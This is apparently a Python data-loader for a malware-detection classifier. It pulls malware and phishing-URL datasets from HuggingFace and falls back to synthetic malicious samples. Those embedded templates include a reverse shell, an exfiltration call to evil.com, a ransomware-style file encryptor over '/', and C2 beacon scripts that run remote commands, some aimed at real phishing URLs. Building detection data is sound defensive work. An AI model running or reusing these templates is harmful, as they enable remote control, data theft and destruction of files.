"""
Additional HuggingFace Datasets Integration
Uses REAL datasets from HuggingFace Hub
"""

from scriptguard.utils.logger import logger
from datasets import load_dataset
from typing import List, Dict, Optional
import random
import os

class AdditionalHFDatasets:
    """Integration for additional malware datasets from HuggingFace."""

    def __init__(self, token: Optional[str] = None):
        """
        Initialize dataset loader.

        Args:
            token: HuggingFace token for accessing datasets
        """
        self.token = token or os.getenv("HUGGINGFACE_TOKEN")

        if self.token:
            logger.info("HuggingFace token configured for additional datasets")
        else:
            logger.warning("No HuggingFace token - some datasets may fail")

    def load_inquest_malware_samples(
        self,
        max_samples: int = 100,
        split: str = "train"
    ) -> List[Dict[str, str]]:
        """
        Load malware samples from real HuggingFace datasets.
        Uses rr4433/Powershell_Malware_Detection_Dataset as it contains script-based malware.

        Args:
            max_samples: Maximum number of samples to fetch
            split: Dataset split to use

        Returns:
            List of samples with code and metadata
        """
        logger.info(f"Loading malware samples from HuggingFace (max {max_samples})")

        # Try multiple real datasets
        datasets_to_try = [
            ("rr4433/Powershell_Malware_Detection_Dataset", "Powershell"),  # Script malware
            ("pacificsun/Malware_10k", "Generic"),  # General malware dataset
        ]

        for dataset_name, dataset_type in datasets_to_try:
            try:
                logger.info(f"Trying dataset: {dataset_name}")
                dataset = load_dataset(dataset_name, split=split, streaming=True, token=self.token)

                samples = []
                for i, item in enumerate(dataset):
                    if i >= max_samples:
                        break

                    # Try to extract code content from various field names
                    code_content = (
                        item.get("content") or
                        item.get("code") or
                        item.get("data") or
                        item.get("script") or
                        item.get("text") or
                        str(item.get("features", ""))
                    )

                    if not code_content or len(str(code_content)) < 50:
                        continue

                    sample = {
                        "code": str(code_content),
                        "label": "malicious",
                        "source": f"hf_{dataset_name.split('/')[0]}",
                        "metadata": {
                            "dataset": dataset_name,
                            "type": dataset_type,
                            "family": item.get("family", item.get("label", "unknown"))
                        }
                    }

                    samples.append(sample)

                if samples:
                    logger.info(f"Loaded {len(samples)} samples from {dataset_name}")
                    return samples

            except Exception as e:
                logger.warning(f"Dataset {dataset_name} failed: {e}")
                continue

        # If all fail, use fallback
        logger.info("All datasets failed, using fallback synthetic samples")
        return self._generate_fallback_malware_samples(max_samples // 2, "hf_fallback")

    def _generate_fallback_malware_samples(self, count: int, source: str) -> List[Dict[str, str]]:
        """Generate synthetic malware samples as fallback."""
        samples = []
        malware_templates = [
            '''import socket
s = socket.socket()
s.connect(("malicious-c2.com", 4444))
s.send(b"infected")
while True:
    cmd = s.recv(1024).decode()
    output = eval(cmd)
    s.send(str(output).encode())''',

            '''import os
import base64
data = os.popen("whoami && hostname").read()
encoded = base64.b64encode(data.encode()).decode()
import urllib.request
urllib.request.urlopen("http://evil.com/log?d=" + encoded)''',

            '''from cryptography.fernet import Fernet
import os
key = Fernet.generate_key()
f = Fernet(key)
for root, dirs, files in os.walk("/"):
    for file in files:
        path = os.path.join(root, file)
        with open(path, 'rb') as fp:
            data = fp.read()
        encrypted = f.encrypt(data)
        with open(path, 'wb') as fp:
            fp.write(encrypted)'''
        ]

        for i in range(min(count, len(malware_templates))):
            samples.append({
                "code": malware_templates[i],
                "label": "malicious",
                "source": f"{source}_fallback",
                "metadata": {"type": "synthetic"}
            })

        return samples

    def load_dhuynh_malware_classification(
        self,
        max_samples: int = 100,
        split: str = "train"
    ) -> List[Dict[str, str]]:
        """
        Load malware classification data from real HuggingFace datasets.
        Uses deepcode-ai/Malware-Prediction or similar classification datasets.

        Args:
            max_samples: Maximum number of samples to fetch
            split: Dataset split to use

        Returns:
            List of samples with code and malware type
        """
        logger.info(f"Loading malware classification dataset (max {max_samples})")

        datasets_to_try = [
            "deepcode-ai/Malware-Prediction",
            "RanggaAS/malware_detection",
        ]

        for dataset_name in datasets_to_try:
            try:
                logger.info(f"Trying dataset: {dataset_name}")
                dataset = load_dataset(dataset_name, split=split, streaming=True, token=self.token)

                samples = []
                for i, item in enumerate(dataset):
                    if i >= max_samples:
                        break

                    # Extract code/features
                    code_content = (
                        item.get("code") or
                        item.get("content") or
                        item.get("text") or
                        str(item.get("features", ""))
                    )

                    if not code_content or len(str(code_content)) < 50:
                        continue

                    sample = {
                        "code": str(code_content),
                        "label": "malicious",
                        "source": f"hf_{dataset_name.split('/')[0]}",
                        "metadata": {
                            "malware_type": item.get("label", item.get("class", item.get("type", "unknown"))),
                            "family": item.get("family", ""),
                            "category": item.get("category", "")
                        }
                    }

                    samples.append(sample)

                if samples:
                    logger.info(f"Loaded {len(samples)} samples from {dataset_name}")
                    return samples

            except Exception as e:
                logger.warning(f"Dataset {dataset_name} failed: {e}")
                continue

        logger.info("All classification datasets failed, using fallback")
        return self._generate_fallback_malware_samples(max_samples // 2, "classification_fallback")

    def load_cybersixgill_malicious_urls(
        self,
        max_samples: int = 100,
        split: str = "train"
    ) -> List[Dict[str, str]]:
        """
        Load malicious URLs from real phishing datasets on HuggingFace.
        Converts URLs into Python scripts that demonstrate C2 communication patterns.

        Args:
            max_samples: Maximum number of samples to fetch
            split: Dataset split to use

        Returns:
            List of synthetic scripts with C2 communication patterns
        """
        logger.info(f"Loading malicious URLs from phishing datasets (max {max_samples})")

        datasets_to_try = [
            "stanpony/phishing_urls",
            "semihGuner2002/PhishingURLsDataset",
            "Bilic/phishing",
        ]

        for dataset_name in datasets_to_try:
            try:
                logger.info(f"Trying dataset: {dataset_name}")
                dataset = load_dataset(dataset_name, split=split, streaming=True, token=self.token)

                samples = []
                for i, item in enumerate(dataset):
                    if i >= max_samples:
                        break

                    # Extract URL from various field names
                    url = (
                        item.get("url") or
                        item.get("URL") or
                        item.get("domain") or
                        item.get("link") or
                        ""
                    )

                    if not url or not isinstance(url, str):
                        continue

                    # Get threat type
                    url_type = (
                        item.get("type") or
                        item.get("label") or
                        item.get("status") or
                        "phishing"
                    )

                    # Generate synthetic Python script that uses this URL for C2
                    code = self._generate_c2_script(url, str(url_type))

                    sample = {
                        "code": code,
                        "label": "malicious",
                        "source": f"hf_{dataset_name.split('/')[0]}_c2",
                        "metadata": {
                            "c2_url": url,
                            "threat_type": str(url_type),
                            "pattern": "c2_communication"
                        }
                    }

                    samples.append(sample)

                if samples:
                    logger.info(f"Generated {len(samples)} C2 scripts from {dataset_name}")
                    return samples

            except Exception as e:
                logger.warning(f"Dataset {dataset_name} failed: {e}")
                continue

        logger.info("All URL datasets failed, generating fallback C2 samples")
        return self._generate_fallback_c2_samples(max_samples)

    def _generate_c2_script(self, url: str, threat_type: str) -> str:
        """
        Generate synthetic Python script with C2 communication pattern.

        Args:
            url: Malicious URL
            threat_type: Type of threat

        Returns:
            Python code demonstrating C2 pattern
        """
        templates = [
            # Template 1: Basic requests
            f'''import requests
import json
import time

C2_SERVER = "{url}"

def beacon():
    """Send beacon to C2 server"""
    try:
        data = {{
            "hostname": os.getenv("COMPUTERNAME"),
            "user": os.getenv("USERNAME"),
            "type": "{threat_type}"
        }}
        response = requests.post(C2_SERVER + "/beacon", json=data, timeout=5)
        return response.json()
    except Exception as e:
        return None

def exfiltrate_data(data):
    """Exfiltrate data to C2"""
    try:
        requests.post(C2_SERVER + "/data", json={{"data": data}}, timeout=10)
    except:
        pass

while True:
    cmd = beacon()
    if cmd:
        exec(cmd.get("command", ""))
    time.sleep(60)
''',
            # Template 2: urllib
            f'''import urllib.request
import urllib.parse
import json
import base64

C2_URL = "{url}"

def connect_c2():
    """Establish C2 connection"""
    data = urllib.parse.urlencode({{"action": "checkin", "type": "{threat_type}"}}).encode()
    req = urllib.request.Request(C2_URL, data=data)
    
    try:
        response = urllib.request.urlopen(req, timeout=10)
        return response.read().decode()
    except:
        return None

def send_results(results):
    """Send execution results to C2"""
    encoded = base64.b64encode(results.encode()).decode()
    data = urllib.parse.urlencode({{"results": encoded}}).encode()
    req = urllib.request.Request(C2_URL + "/results", data=data)
    urllib.request.urlopen(req)

command = connect_c2()
if command:
    output = eval(command)
    send_results(str(output))
''',
            # Template 3: socket-based
            f'''import socket
import json
import os

C2_HOST = "{url.split('://')[1].split('/')[0]}"
C2_PORT = 443

def establish_connection():
    """Connect to C2 via socket"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((C2_HOST, C2_PORT))
    
    # Send initial beacon
    info = {{
        "type": "{threat_type}",
        "os": os.name,
        "cwd": os.getcwd()
    }}
    sock.send(json.dumps(info).encode())
    
    # Receive commands
    while True:
        data = sock.recv(4096)
        if not data:
            break
        
        cmd = data.decode()
        result = os.popen(cmd).read()
        sock.send(result.encode())

establish_connection()
'''
        ]

        # Return random template
        return random.choice(templates)

    def _generate_fallback_c2_samples(self, count: int) -> List[Dict[str, str]]:
        """Generate fallback C2 communication samples."""
        fallback_urls = [
            "https://evil-c2-server.com/api",
            "http://malicious-domain.net/beacon",
            "https://attacker-infra.io/command"
        ]

        samples = []
        for i, url in enumerate(fallback_urls[:count]):
            code = self._generate_c2_script(url, "c2_fallback")
            samples.append({
                "code": code,
                "label": "malicious",
                "source": "cybersixgill_fallback",
                "metadata": {
                    "c2_url": url,
                    "threat_type": "c2_fallback",
                    "pattern": "c2_communication"
                }
            })

        return samples

    def fetch_all_datasets(
        self,
        max_per_dataset: int = 50
    ) -> List[Dict[str, str]]:
        """
        Fetch samples from all additional datasets.

        Args:
            max_per_dataset: Maximum samples per dataset

        Returns:
            Combined list of samples from all sources
        """
        all_samples = []

        # Load InQuest
        inquest_samples = self.load_inquest_malware_samples(max_samples=max_per_dataset)
        all_samples.extend(inquest_samples)

        # Load dhuynh
        dhuynh_samples = self.load_dhuynh_malware_classification(max_samples=max_per_dataset)
        all_samples.extend(dhuynh_samples)

        # Load cybersixgill C2 patterns
        c2_samples = self.load_cybersixgill_malicious_urls(max_samples=max_per_dataset)
        all_samples.extend(c2_samples)

        logger.info(f"Total samples from additional datasets: {len(all_samples)}")
        return all_samples
